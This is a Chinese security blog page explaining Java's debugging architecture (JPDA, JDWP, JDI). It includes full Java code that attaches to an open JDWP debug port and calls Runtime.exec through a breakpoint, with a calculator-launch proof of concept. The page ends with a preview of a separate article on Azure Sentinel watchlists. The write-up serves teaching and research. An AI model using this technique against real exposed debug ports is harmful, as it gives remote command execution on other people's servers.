+12345678910111213VirtualMachineManager vmm = Bootstrap.virtualMachineManager();List&lt;AttachingConnector&gt; connectors = vmm.attachingConnectors();SocketAttachingConnector sac = null;for (AttachingConnector ac : connectors) &#123;    if (ac instanceof SocketAttachingConnector) &#123;        sac = (SocketAttachingConnector) ac;        break;    &#125;&#125;if (sac == null) &#123;    System.out.println(&quot;JDI error&quot;);    return;&#125;
+2.链接到JVM
+12345678910Map&lt;String, Connector.Argument&gt; arguments = sac.defaultArguments();Connector.Argument hostArg = (Connector.Argument) arguments.get(HOST);Connector.Argument portArg = (Connector.Argument) arguments.get(PORT);hostArg.setValue(&quot;127.0.0.1&quot;);portArg.setValue(String.valueOf(8800));vm = sac.attach(arguments);process = vm.process();eventRequestManager = vm.eventRequestManager();
+
+3.获取要调试的类和方法名称
+123456789101112List&lt;ReferenceType&gt; classesByName = vm.classesByName(&quot;test.Test&quot;);if (classesByName == null || classesByName.size() == 0) &#123;    System.out.println(&quot;No class found&quot;);    return;&#125;ReferenceType rt = classesByName.get(0);List&lt;Method&gt; methodsByName = rt.methodsByName(&quot;printHello&quot;);if (methodsByName == null || methodsByName.size() == 0) &#123;    System.out.println(&quot;No method found&quot;);    return;&#125;Method method = methodsByName.get(0);
+
+4.设置要调试的断点
+获取断点进程
+12345BreakpointEvent breakpointEvent = (BreakpointEvent) event;ThreadReference threadReference = breakpointEvent.thread();StackFrame stackFrame = threadReference.frame(0);stackFrame.visibleVariables();
+
+设置断点位置和断点事件
+123456789// Get locationReferenceType referenceType = classPrepareEvent.referenceType();List locations = referenceType.locationsOfLine(34);Location location = (Location) locations.get(0);// Create BreakpointEventBreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(location);breakpointRequest.setSuspendPolicy(EventRequest.SUSPEND_ALL);breakpointRequest.enable();
+
+
+5.监听断点并执行调试
+12345678vm.setDebugTraceMode(VirtualMachine.TRACE_EVENTS);vm.resume();List&lt;Location&gt; locations = classesByName.get(0).locationsOfLine(34);BreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(locations.get(0));breakpointRequest.enable();eventLoop();  //要调试的断点和执行
+
+
+5.JDWP 命令执行原理原理部分参考：https://ioactive.com/hacking-java-debug-wire-protocol-or-how/
+
+获取 Java 运行时参考JVM 通过对象的引用来操作对象。因此，我们的漏洞利用必须首先获取对 java.lang.Runtime 类的引用。从这个类中，我们需要对 getRuntime() 方法的引用。这是通过获取所有类（AllClasses 数据包）和我们正在寻找的类中的所有方法（ReferenceType/Methods 数据包）来执行的。
+ 
+设置断点并等待通知（异步调用）这是我们利用的关键。要调用任意代码，我们需要处于正在运行的线程上下文中。为此，hack 是在已知在运行时调用的方法上设置断点。如前所述，JDI 中的断点是一个异步事件，其类型设置为 BREAKPOINT(0x02)。当命中时，JVM 向我们的调试器发送一个 EventData 数据包，其中包含我们的断点 ID，更重要的是，对命中它的线程的引用。
+
+
+因此，将其设置在经常调用的方法上是一个好主意，例如 java.net.ServerSocket.accept()，每次服务器接收到新的网络连接时很可能会调用该方法。但是，必须记住，它可以是运行时存在的任何方法。 3.在Runtime中分配一个Java String对象来执行payload我们将在 JVM 运行时中执行代码，因此我们所有的操作数据（如字符串）必须存在于 JVM 运行时中（即拥有运行时引用）。这很容易通过发送 CreateString 命令来完成。
+
+
+从断点上下文中获取运行时对象在这一点上，我们几乎拥有成功、可靠利用所需的所有元素。我们缺少的是运行时对象引用。获取很简单，我们可以简单的在JVM运行时执行java.lang.Runtime.getRuntime()静态方法[8]，通过发送ClassType/InvokeMethod包并提供Runtime类和线程引用。
+ 
+在Runtime实例中查找并调用exec()方法最后一步是简单地在上一步获得的运行时静态对象中查找 exec() 方法，并使用我们在第三步中创建的 String 对象调用它（通过发送 ObjectReference/InvokeMethod 数据包）。
+
+ 
+6.基于JDI实现命令调用123456789101112131415161718192021222324252627282930313233343536373839private static void exec(ThreadReference threadReference) throws Exception &#123;        //目标虚拟机中对象的类型。 ReferenceType包含The Java™ Language Specification中定义的类，接口和数组类型。 所有ReferenceType对象都属于以下子接口之一： ClassType用于类， InterfaceType用于接口， ArrayType用于阵列。 请注意，原始类（例如Integer.TYPE的reflected type ）被表示为ClassType。        // VM为所有三个创建Class对象，因此从VM的角度来看，每个ReferenceType映射到一个不同的Class对象。        /*//获取对象            Class cls = Class.forName(&quot;java.lang.Runtime&quot;);            //实例化对象            Object ob = cls.getMethod(&quot;getRuntime&quot;,null).invoke(null,null);            // 反射调用执行命令            cls.getMethod(&quot;exec&quot;, String.class).invoke(ob,&quot;calc&quot;);*/        ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();        Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);        //Java.lang.Class.getMethod()        //返回一个 Method 对象        Method getMethodInvoke = vm.classesByName(&quot;java.lang.reflect.Method&quot;).get(0).methodsByName(&quot;invoke&quot;).get(0);        //java.lang.reflect.Method.invoke        Method getExecMethod = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).methodsByName(&quot;exec&quot;).get(0);        //java.lang.Runtime.exec        List&lt;Value&gt; param1 = new ArrayList&lt;&gt;();        param1.add(vm.mirrorOf(&quot;getRuntime&quot;));        //在此虚拟机中创建一个字符串。        ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);        //invokeMethod(ThreadReference thread, Method method, List&lt;? extends Value&gt; arguments, int options)        //调用目标 VM 中此对象的指定方法。  java.lang.Runtime.getRuntime()        List&lt;Value&gt; param2 = new ArrayList&lt;&gt;();        param2.add(null);        ObjectReference runtimeIns = (ObjectReference) getRuntimeMethodRe.invokeMethod(threadReference, getMethodInvoke, param2, 1);        //java.lang.Runtime.getRuntime().invoke()        List&lt;Value&gt; param3 = new ArrayList&lt;&gt;();        param3.add(vm.mirrorOf(&quot;open /System/Applications/Calculator.app&quot;));        runtimeIns.invokeMethod(threadReference, getExecMethod, param3, 1);        //java.lang.Runtime.getRuntime().exec(&quot;cmd&quot;).invoke()    &#125;
+监听可能会执行到的线程，等待触发，可以选择大概率会被触发的类的线程来监听，例如“java.net.ServerSocket.accep”、“java.lang.String”等
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="1-JPDA"><a href="#1-JPDA" class="headerlink" title="1.JPDA"></a>1.JPDA</h2><p>JPDA(Java Platform Debugger Architecture) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。<br>JPDA 主要由三个部分组成：</p>
+<pre><code>Java 虚拟机工具接口（JVMTI）
+Java 调试线协议（JDWP）
+Java 调试接口（JDI）
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<h2 id="2-JVM-TI"><a href="#2-JVM-TI" class="headerlink" title="2.JVM TI"></a>2.JVM TI</h2><p>JVMTI其实就是一套由虚拟机直接提供的本地代码接口，包含了调试、监听、线程分析及覆盖率分析等接口，它处于整个JPDA体系的最底层。</p>
+<p>一般可以通过采用建立一个Agent的方式来使用JVMTI，其显著的特征就是通过设置回调函数的方式，从java虚拟机上得到当前运行态信息，并做出自己的相应的操作，抑或操作虚拟机的运行态，以达到一些特定的目的（如优化程序性能）。</p>
+<p>把Agent编译成一个动态链接库后，就可以在java程序启动/运行的时候（增加启动参数agentlib/ agentpath）来加载它。</p>
+<p>以启动时加载为例:</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<h2 id="3-JDWP"><a href="#3-JDWP" class="headerlink" title="3.JDWP"></a>3.JDWP</h2><p>JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。</p>
+<p>Target vm 中运行着我们希望要调试的程序，它与一般运行的 Java 虚拟机没有什么区别，只是在启动时加载了 Agent JDWP 从而具备了调试功能。</p>
+<p>debugger 向运行中的 target vm 发送命令来获取 target vm 运行时的状态和控制 Java 程序的执行。</p>
+<h3 id="3-1JDWP-Start-Up"><a href="#3-1JDWP-Start-Up" class="headerlink" title="3.1JDWP Start Up"></a>3.1JDWP Start Up</h3><p>在建立传输链接之后，连接的两端首先会进行握手，然后再进行其它数据包的传输。<br>握手的步骤有以下两步：<br>    1. debugger侧发送14 bytes 的 14个ASCII字符 “JDWP-Handshake”到VM中；<br>    2. VM回复相同的14 bytes “JDWP-Handshake” 完成握手。</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/en/java/javase/12/docs/specs/jdwp/jdwp-spec.html">https://docs.oracle.com/en/java/javase/12/docs/specs/jdwp/jdwp-spec.html<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="3-2Packet结构"><a href="#3-2Packet结构" class="headerlink" title="3.2Packet结构"></a>3.2Packet结构</h3><p>命令包（command packet）和回复包（reply packet），Packet分为包头（header）和数据（data）两部分组成。包头部分的结构和长度是固定的，而数据部分的长度是可变的。command packet和reply packet的包头长度相同，都是11个bytes。</p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>Length 和 Id 字段是不言自明的。Flag 字段仅用于区分请求包和回复包，值为 0x80 表示回复包。CommandSet 字段定义了命令的类别，如下表所示。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令集	      命令</span><br><span class="line">0x40	       JVM 采取的行动（例如设置断点）</span><br><span class="line">0x40–0x7F	   向调试器提供事件信息（例如，JVM 已达到断点并等待进一步的操作）</span><br><span class="line">0x80	       第三方扩展</span><br></pre></td></tr></table></figure>
+
+<p>请记住，我们要执行任意代码，以下命令对我们来说是最有趣的。<br>    •    VirtualMachine/IDSizes 定义了 JVM 处理的数据结构的大小。这是 nmap 脚本 jdwp-exec.nse[11] 不起作用的原因之一，因为该脚本使用硬编码的大小。<br>    •    ClassType/InvokeMethod 允许您调用静态函数。<br>    •    ObjectReference/InvokeMethod 允许您从 JVM 中的实例化对象调用函数。<br>    •    StackFrame/(Get|Set)Values 提供从线程堆栈推送/弹出功能。<br>    •    Event/Composite 强制 JVM 对该命令声明的特定行为做出反应。此命令是调试目的的主要关键，因为它允许设置断点，在运行时单步执行线程，并在以与 GDB 或 WinDBG 完全相同的方式访问/修改值时收到通知。<br> <br>JDWP 不仅允许您访问和调用已驻留在内存中的对象，还允许您创建或覆盖数据。<br>    •    VirtualMachine/CreateString 允许您将字符串转换为存在于 JVM 运行时中的 java.lang.String。<br>    •    VirtualMachine/RedefineClasses 允许您安装新的类定义。</p>
+<p>上述的定义是重要的，JDI可以利用invokeMethod调用目标 VM 中此对象的指定方法，这是实现命令执行的关键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();</span><br><span class="line">Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);</span><br><span class="line">…….</span><br><span class="line"></span><br><span class="line">ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="3-3Using-JDWP"><a href="#3-3Using-JDWP" class="headerlink" title="3.3Using JDWP"></a>3.3Using JDWP</h3><p>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=8000</p>
+<pre><code>-agentlib:jdwp ：JVM加载jdwp代理
+transport=dt_socket ： 使用socket传输
+server=y ： JVM将listen for a debugger注入到其中
+suspend=y  ： JVM在执行主类之前等待debugger attach，如果设置为n，则直接执行主类，同时进行监听
+address=8000 ： 指定套接字的端口，在JDK9及以后，这种配置只监听localhost的8000端口
+</code></pre>
+<h2 id="4-Debug过程"><a href="#4-Debug过程" class="headerlink" title="4.Debug过程"></a>4.Debug过程</h2><p>1、先建立起了 socket 连接</p>
+<p>2、将断点位置创建了断点事件通过 JDI 接口传给了 服务端（程序端）的 VM，VM 调用 suspend 将 VM 挂起</p>
+<p>3、VM 挂起之后将客户端需要获取的 VM 信息返回给客户端，返回之后 VM resume 恢复其运行状态</p>
+<p>4、客户端获取到 VM 返回的信息之后可以通过不同的方式展示给客户</p>
+<h3 id="4-1基于JDI编写一个调试代码"><a href="#4-1基于JDI编写一个调试代码" class="headerlink" title="4.1基于JDI编写一个调试代码"></a>4.1基于JDI编写一个调试代码</h3><p>1.创建Connector</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachineManager vmm = Bootstrap.virtualMachineManager();</span><br><span class="line">List&lt;AttachingConnector&gt; connectors = vmm.attachingConnectors();</span><br><span class="line">SocketAttachingConnector sac = null;</span><br><span class="line">for (AttachingConnector ac : connectors) &#123;</span><br><span class="line">    if (ac instanceof SocketAttachingConnector) &#123;</span><br><span class="line">        sac = (SocketAttachingConnector) ac;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (sac == null) &#123;</span><br><span class="line">    System.out.println(&quot;JDI error&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2.链接到JVM</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Connector.Argument&gt; arguments = sac.defaultArguments();</span><br><span class="line">Connector.Argument hostArg = (Connector.Argument) arguments.get(HOST);</span><br><span class="line">Connector.Argument portArg = (Connector.Argument) arguments.get(PORT);</span><br><span class="line"></span><br><span class="line">hostArg.setValue(&quot;127.0.0.1&quot;);</span><br><span class="line">portArg.setValue(String.valueOf(8800));</span><br><span class="line"></span><br><span class="line">vm = sac.attach(arguments);</span><br><span class="line">process = vm.process();</span><br><span class="line">eventRequestManager = vm.eventRequestManager();</span><br></pre></td></tr></table></figure>
+
+<p>3.获取要调试的类和方法名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ReferenceType&gt; classesByName = vm.classesByName(&quot;test.Test&quot;);</span><br><span class="line">if (classesByName == null || classesByName.size() == 0) &#123;</span><br><span class="line">    System.out.println(&quot;No class found&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">ReferenceType rt = classesByName.get(0);</span><br><span class="line">List&lt;Method&gt; methodsByName = rt.methodsByName(&quot;printHello&quot;);</span><br><span class="line">if (methodsByName == null || methodsByName.size() == 0) &#123;</span><br><span class="line">    System.out.println(&quot;No method found&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">Method method = methodsByName.get(0);</span><br></pre></td></tr></table></figure>
+
+<p>4.设置要调试的断点</p>
+<p>获取断点进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BreakpointEvent breakpointEvent = (BreakpointEvent) event;</span><br><span class="line">ThreadReference threadReference = breakpointEvent.thread();</span><br><span class="line">StackFrame stackFrame = threadReference.frame(0);</span><br><span class="line"></span><br><span class="line">stackFrame.visibleVariables();</span><br></pre></td></tr></table></figure>
+
+<p>设置断点位置和断点事件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Get location</span><br><span class="line">ReferenceType referenceType = classPrepareEvent.referenceType();</span><br><span class="line">List locations = referenceType.locationsOfLine(34);</span><br><span class="line">Location location = (Location) locations.get(0);</span><br><span class="line"></span><br><span class="line">// Create BreakpointEvent</span><br><span class="line">BreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(location);</span><br><span class="line">breakpointRequest.setSuspendPolicy(EventRequest.SUSPEND_ALL);</span><br><span class="line">breakpointRequest.enable();</span><br></pre></td></tr></table></figure>
+
+
+<p>5.监听断点并执行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vm.setDebugTraceMode(VirtualMachine.TRACE_EVENTS);</span><br><span class="line">vm.resume();</span><br><span class="line"></span><br><span class="line">List&lt;Location&gt; locations = classesByName.get(0).locationsOfLine(34);</span><br><span class="line">BreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(locations.get(0));</span><br><span class="line">breakpointRequest.enable();</span><br><span class="line"></span><br><span class="line">eventLoop();  //要调试的断点和执行</span><br></pre></td></tr></table></figure>
+
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<h2 id="5-JDWP-命令执行原理"><a href="#5-JDWP-命令执行原理" class="headerlink" title="5.JDWP 命令执行原理"></a>5.JDWP 命令执行原理</h2><p>原理部分参考：<a class="link" target="_blank" rel="noopener" href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/">https://ioactive.com/hacking-java-debug-wire-protocol-or-how/<i class="fas fa-external-link-alt"></i></a></p>
+<ol>
+<li>获取 Java 运行时参考<br>JVM 通过对象的引用来操作对象。因此，我们的漏洞利用必须首先获取对 java.lang.Runtime 类的引用。从这个类中，我们需要对 getRuntime() 方法的引用。这是通过获取所有类（AllClasses 数据包）和我们正在寻找的类中的所有方法（ReferenceType/Methods 数据包）来执行的。
+ </li>
+<li>设置断点并等待通知（异步调用）<br>这是我们利用的关键。要调用任意代码，我们需要处于正在运行的线程上下文中。为此，hack 是在已知在运行时调用的方法上设置断点。如前所述，JDI 中的断点是一个异步事件，其类型设置为 BREAKPOINT(0x02)。当命中时，JVM 向我们的调试器发送一个 EventData 数据包，其中包含我们的断点 ID，更重要的是，对命中它的线程的引用。</li>
+</ol>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p>因此，将其设置在经常调用的方法上是一个好主意，例如 java.net.ServerSocket.accept()，每次服务器接收到新的网络连接时很可能会调用该方法。但是，必须记住，它可以是运行时存在的任何方法。<br> <br>3.在Runtime中分配一个Java String对象来执行payload<br>我们将在 JVM 运行时中执行代码，因此我们所有的操作数据（如字符串）必须存在于 JVM 运行时中（即拥有运行时引用）。这很容易通过发送 CreateString 命令来完成。</p>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<ol start="4">
+<li>从断点上下文中获取运行时对象<br>在这一点上，我们几乎拥有成功、可靠利用所需的所有元素。我们缺少的是运行时对象引用。获取很简单，我们可以简单的在JVM运行时执行java.lang.Runtime.getRuntime()静态方法[8]，通过发送ClassType/InvokeMethod包并提供Runtime类和线程引用。
+ </li>
+<li>在Runtime实例中查找并调用exec()方法<br>最后一步是简单地在上一步获得的运行时静态对象中查找 exec() 方法，并使用我们在第三步中创建的 String 对象调用它（通过发送 ObjectReference/InvokeMethod 数据包）。</li>
+</ol>
+<p><img lazyload src="/images/loading.svg" data-src="7.png"> </p>
+<h2 id="6-基于JDI实现命令调用"><a href="#6-基于JDI实现命令调用" class="headerlink" title="6.基于JDI实现命令调用"></a>6.基于JDI实现命令调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">private static void exec(ThreadReference threadReference) throws Exception &#123;</span><br><span class="line">        //目标虚拟机中对象的类型。 ReferenceType包含The Java™ Language Specification中定义的类，接口和数组类型。 所有ReferenceType对象都属于以下子接口之一： ClassType用于类， InterfaceType用于接口， ArrayType用于阵列。 请注意，原始类（例如Integer.TYPE的reflected type ）被表示为ClassType。</span><br><span class="line">        // VM为所有三个创建Class对象，因此从VM的角度来看，每个ReferenceType映射到一个不同的Class对象。</span><br><span class="line"></span><br><span class="line">        /*//获取对象</span><br><span class="line">            Class cls = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">            //实例化对象</span><br><span class="line">            Object ob = cls.getMethod(&quot;getRuntime&quot;,null).invoke(null,null);</span><br><span class="line">            // 反射调用执行命令</span><br><span class="line">            cls.getMethod(&quot;exec&quot;, String.class).invoke(ob,&quot;calc&quot;);</span><br><span class="line">*/</span><br><span class="line">        ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();</span><br><span class="line">        Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);</span><br><span class="line">        //Java.lang.Class.getMethod()</span><br><span class="line">        //返回一个 Method 对象</span><br><span class="line">        Method getMethodInvoke = vm.classesByName(&quot;java.lang.reflect.Method&quot;).get(0).methodsByName(&quot;invoke&quot;).get(0);</span><br><span class="line">        //java.lang.reflect.Method.invoke</span><br><span class="line">        Method getExecMethod = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).methodsByName(&quot;exec&quot;).get(0);</span><br><span class="line">        //java.lang.Runtime.exec</span><br><span class="line">        List&lt;Value&gt; param1 = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        param1.add(vm.mirrorOf(&quot;getRuntime&quot;));</span><br><span class="line">        //在此虚拟机中创建一个字符串。</span><br><span class="line">        ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);</span><br><span class="line">        //invokeMethod(ThreadReference thread, Method method, List&lt;? extends Value&gt; arguments, int options)</span><br><span class="line">        //调用目标 VM 中此对象的指定方法。  java.lang.Runtime.getRuntime()</span><br><span class="line"></span><br><span class="line">        List&lt;Value&gt; param2 = new ArrayList&lt;&gt;();</span><br><span class="line">        param2.add(null);</span><br><span class="line">        ObjectReference runtimeIns = (ObjectReference) getRuntimeMethodRe.invokeMethod(threadReference, getMethodInvoke, param2, 1);</span><br><span class="line">        //java.lang.Runtime.getRuntime().invoke()</span><br><span class="line"></span><br><span class="line">        List&lt;Value&gt; param3 = new ArrayList&lt;&gt;();</span><br><span class="line">        param3.add(vm.mirrorOf(&quot;open /System/Applications/Calculator.app&quot;));</span><br><span class="line"></span><br><span class="line">        runtimeIns.invokeMethod(threadReference, getExecMethod, param3, 1);</span><br><span class="line">        //java.lang.Runtime.getRuntime().exec(&quot;cmd&quot;).invoke()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>监听可能会执行到的线程，等待触发，可以选择大概率会被触发的类的线程来监听，例如“java.net.ServerSocket.accep”、“java.lang.String”等</p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"><br><img lazyload src="/images/loading.svg" data-src="9.png"><br><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Sep 06 2021 21:00:00 GMT+0800">2021-09-06</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/%E4%BB%8E%E7%BC%96%E5%86%99JDI%E8%B0%83%E8%AF%95%E5%88%B0%E5%AE%9E%E7%8E%B0JDWP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Azure%20Sentinel%20webinar:%20Enabling%20User%20and%20Entity%20Behavior%20Analytics%20(UEBA)/">
+                        Azure Sentinel webinar：Enabling User and Entity Behavior Analytics (UEBA)
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        什么是用户和实体行为分析 (UEBA)？识别组织内的威胁及其潜在影响（无论是被入侵的实体还是恶意内部因素）始终是一个耗时耗力的过程。 筛选警报、连接各点和主动搜寻都需要大量的时间和精力，却只有极少回报，而复杂的潜在威胁却很难发现。 特别难以发现的威胁（如零日威胁、针对性威胁和高级持久性威胁）对组织来说是最危险的，因此能够检测这些威胁则变得更加重要。
+
+
+￼
+安全驱动的分析受 Gartner 的 UEBA 解决方案范例的启发，Microsoft Sentinel 根据 3 个参考框架提供了一种“由外而内”的方法：
+
+    用例：MITRE ATT&amp;CK 策略、技术和分解技术框架将各种实体作为受害者、作恶者或枢轴点放入杀伤链中，Microsoft Sentinel 根据按照此框架开展的安全性研究对相关攻击途径和方案划分优先级，从而特别专注于每个数据源可以提供的最有价值的日志。
+
+
+    数据源：尽管首要支持 Azure 数据源，但出于周全性考虑，Microsoft Sentinel 选择第三方数据源来提供与我们的威胁方案相匹配的数据。
+
+
+    分析：Microsoft Sentinel 使用各种机器学习 (ML) 算法来识别异常活动，并以上下文信息丰富的形式清晰、准确地呈现证据，相关示例如下所示。
+
+
+
+￼
+
+Microsoft Sentinel 提供的项目可帮助安全分析师结合上下文并通过对比用户的基线概况来清楚地了解环境中的异常活动。 用户（或主机、地址）执行的操作在上下文中进行评估，“true”结果则表示发现异常：
+
+    跨地理位置、设备和环境。
+
+
+    跨时间和频率（与用户自己的历史记录相比）。
+
+
+    与对等方的行为进行比较。
+
+
+    与组织的行为进行比较。
+
+
+
+￼￼
+计分每个活动都使用“调查优先级评分”进行评分，该评分根据对用户及其对等方的行为学习来确定特定用户执行特定活动的概率。 被识别为最不正常的活动会获得最高分（分数范围为 0-10 分）。
+时间线
+规则模版https://docs.microsoft.com/zh-cn/azure/sentinel/watchlist-schemas
+高价值资产“高价值资产”监视列表列出组织中具有重要价值的设备、资源和其他资产，此监视列表包括以下字段：
+
+
+
+字段名称
+格式
+示例
+必需/可选
+
+
+
+资产类型
+字符串
+Device, Azure resource, AWS resource, URL, SPO, File share, Other
+必需
+
+
+资产 ID
+字符串，视资产类型而定
+/subscriptions/d1d8779d-38d7-4f06-91db-9cbc8de0176f/resourceGroups/SOC-Purview/providers/Microsoft.Storage/storageAccounts/purviewadls
+必需
+
+
+资产名称
+字符串
+Microsoft.Storage/storageAccounts/purviewadls
+可选
+
+
+资产 FQDN
+FQDN
+Finance-SRv.local.microsoft.com
+必需
+
+
+IP 地址
+IP
+1.1.1.1
+可选
+
+
+标记
+列出
+[“SAW user”,”Blue Ocean team”]
+可选
+
+
+VIP 用户“VIP 用户”监视列表列出组织中影响力较高的员工的用户帐户，此监视列表包括以下值：
+
+
+
+字段名称
+格式
+示例
+必需/可选
+
+
+
+用户标识符
+UID
+52322ec8-6ebf-11eb-9439-0242ac130002
+可选
+
+
+用户 AAD 对象 ID
+SID
+03fa4b4e-dc26-426f-87b7-98e0c9e2955e
+可选
+
+
+用户本地 SID
+SID
+S-1-12-1-4141952679-1282074057-627758481-2916039507
+可选
+
+
+用户主体名称
+UPN
+&#x4a;&#101;&#102;&#x66;&#x4c;&#64;&#x73;&#101;&#x63;&#99;&#x78;&#x70;&#46;&#110;&#105;&#110;&#x6a;&#97;
+必需
+
+
+标记
+列出
+[“SAW user”,”Blue Ocean team”]
+可选
+
+
+网络映射“网络映射”监视列表列出 IP 子网及其各自的组织上下文，此监视列表包括以下字段：
+
+
+
+字段名称
+格式
+示例
+必需/可选
+
+
+
+IP 子网
+子网范围
+198.51.100.0/24 - 198……/22
+必需
+
+
+范围名
+字符串
